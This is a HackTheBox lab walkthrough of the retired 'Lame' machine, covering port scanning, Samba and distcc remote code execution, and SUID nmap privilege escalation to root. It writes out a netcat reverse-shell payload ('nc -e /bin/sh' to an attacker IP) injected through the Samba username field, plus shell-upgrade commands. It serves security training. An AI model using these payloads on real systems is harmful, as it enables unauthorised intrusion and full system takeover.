---
title: Lame - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-05 12:00:00 
categories: [HackTheBox,Linux]
tags: [smb,distcc,sudo]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Lame/00-banner.png
  width: 585
  height: 370
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Lame` a retired machine by HackTheBox. Without further ado, let’s begin.

# Recon

## Nmap

As always, we'll start with a nmap scan to discover the open ports and services.

![01-nmap](/assets/img/HTB/Lame/01-nmap.png)

Let's start the FTP enumeration, but before we will run a complete nmap scan in the background to make sure we covered all ports.

![02-nmap](/assets/img/HTB/Lame/02-nmap.png)

The new port that we get is 3632 running distccd service, this could be interesting later.

## FTP

FTP allows anonymous login but the directory is empty.
Searching the version of it using `searchsploit` we find that is vulnerable to a backdoor command execution.

![03-ftp](/assets/img/HTB/Lame/03-ftp.png)

This vulnerability conscist in open a backdoor on the port 6200 when the attacker send a string that contains this characters `:)` as the username and nmap has a script to test it.

![04-backdoor](/assets/img/HTB/Lame/04-backdoor.png)

It looks that is not vulnerable.

## Samba

The next interesting service to enumerate is Samba, but for this occasion we must run smbclient with `--option="client min protocol=NT1"` as [argument](https://forum.hackthebox.com/t/psa-fix-to-smbv1-smbclient-issues/2351) to work with SMBv1 shares.

![05-smbclient](/assets/img/HTB/Lame/05-smbclient.png)

We can access to `tmp` directory but there’s nothing interesting in it.

![06-smbclient](/assets/img/HTB/Lame/06-smbclient.png)

Searching for if there any vulnerability in this version of samba we find a command execution.

![07-smb](/assets/img/HTB/Lame/07-smb.png)

# Exploitation #1 - Samba

Checking the [exploit](https://www.exploit-db.com/exploits/16320), It seems samba execute this command ``"/=` nohup nc -e /bin/sh 10.10.14.31 443`"`` when we login with that as username.

![08-revShell](/assets/img/HTB/Lame/08-revShell.png)

We are root!!!

# Exploitation #2 - Distcc

If we remember the complete nmap scan it show us that there a service running on the port 3632, distcc. We can exploit a remote code execution vulnerability in this service using a [nmap script](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html) .

![09-distcc](/assets/img/HTB/Lame/09-distcc.png)

## Shell as daemon

So let's send a reverse shell.

![10-revShell](/assets/img/HTB/Lame/10-revShell.png)

To get a interactive shell just we must run the next commands.
```console
$ python -c 'import pty; pty.spawn("/bin/bash")'
$   ^Z
$ stty raw -echo;fg
$   reset
$ export TERM=xterm
$ export SHELL=bash
```
## Shell as root

As we see in the screenshot below nmap has SUID permissions.

![11-suid](/assets/img/HTB/Lame/11-suid.png)

Running [gtfoshell](https://github.com/Degr4ne/GTFOShell) to search on GTFOBins in terminal, we get the command to get a shell using nmap.

![13-root](/assets/img/HTB/Lame/13-root.png)
![12-gtfoshell](/assets/img/HTB/Lame/12-gtfoshell.png)

Voila!! We are root again.

That’s it for now guys. Until next time.
